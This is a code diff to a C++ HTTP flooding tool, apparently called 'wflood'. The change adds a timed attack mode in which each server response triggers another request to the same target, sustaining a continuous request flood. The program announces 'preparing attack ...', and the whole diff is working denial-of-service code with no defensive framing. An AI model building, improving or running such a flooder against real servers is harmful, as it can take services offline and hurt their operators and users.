@@ -5,20 +5,41 @@
 #include "httpcpp.h"
 #include <iostream>
 #include <unistd.h>
-
+#include "Chrono.h"
+#include "wflood.h"
 
 using namespace std;
 
-static float counter = 0;
+static float counter = -1;
+Chrono chrono;
+AsyncHttpClient *client;
 
 class HttpResponseHndl : public HttpResponseHandler {
-    public:
-        void handle(HttpResponse* const response) {
+private:
+    struct Target target;
+
+public:
+
+    void setTarget(struct Target t) {
+        target = t;
+    }
+
+    void handle(HttpResponse* const response) {
+        if (chrono.isRunning()) {
+            cout << chrono.remain() << " [" << response->get_code() << "] ";
+            HttpResponseHndl *resp = new HttpResponseHndl();
+            resp->setTarget(target);
+            client->fetch(target.host, target.port, target.meth, target.resource, target.data, resp);
+            cout << "injected!" << endl;
+        } else {
             cout << counter-- << " [" << response->get_code() << "] ";
-            cout << response->get_body().size() << " bytes" << endl;
-            if (counter <= 0)
-                exit(1);
         }
+
+        cout << response->get_body().size() << " bytes" << endl;
+
+        if (counter == 0 || chrono.end())
+            exit(1);
+    }
 };
 
 
@@ -38,26 +59,17 @@ void usage() {
 }
 
 int main(int argc, char **argv) {
+    struct Target target;
 
-    /*
-    if (argc != 7) {
-        cout << argv[0] << " [ip] [port] [method] [path] [post] [requests] [timeout] " << endl;
-        cout << "  if the " << endl;
-        exit(1);
-    }*/
 
-    char *host = NULL;
-    char *meth = NULL;
-    char *data = "A";
-    char *resource = NULL;
-    int op,  port=0, timeout=0;
+    int op, timeout=-1;
     while ((op = getopt(argc, argv, "h:p:m:r:c:d:t:")) != EOF) {
         switch(op) {
-            case 'h': host = optarg; break;
-            case 'p': port = atoi(optarg); break;
-            case 'm': meth = optarg; break;
-            case 'r': resource = optarg; break;
-            case 'd': data = optarg; break;
+            case 'h': target.host = optarg; break;
+            case 'p': target.port = atoi(optarg); break;
+            case 'm': target.meth = optarg; break;
+            case 'r': target.resource = optarg; break;
+            case 'd': target.data = optarg; break;
             case 'c': counter = atoi(optarg); break;
             case 't': timeout = atoi(optarg); break;
             case '?': usage(); break;
@@ -65,24 +77,27 @@ int main(int argc, char **argv) {
         }
     }
 
-
-    if (host == NULL || meth == NULL || port == 0 || resource == NULL)
+    if (target.host == NULL || target.meth == NULL || target.port == 0 || target.resource == NULL)
         usage();
 
-    if (counter == 0 && timeout == 0)
+    if (counter == -1 && timeout == -1)
         usage();
-
 
     cout << "preparing attack ..." << endl;
-    AsyncHttpClient *client = new AsyncHttpClient();
-    //cout << " h:" << host << " p:" << port << " m:" << meth << " r:" << resource << " d:" << data << " c:" << counter << endl;
+    client = new AsyncHttpClient();
 
     try {
-        if (counter > 0) {
-            for (float i = 0; i < counter; i++)
-                client->fetch(host, port, meth, resource, data, new HttpResponseHndl);
+        if (timeout > 0) {
+            chrono.start(timeout);
+            HttpResponseHndl *resp = new HttpResponseHndl();
+            resp->setTarget(target);
+            client->fetch(target.host, target.port, target.meth, target.resource, target.data, resp);
+
         } else {
-            cout << "unimplemented" << endl;
+
+            for (float i = 0; i < counter; i++)
+                client->fetch(target.host, target.port, target.meth, target.resource, target.data,
+                              new HttpResponseHndl);
         }
 
     } catch(runtime_error e) {
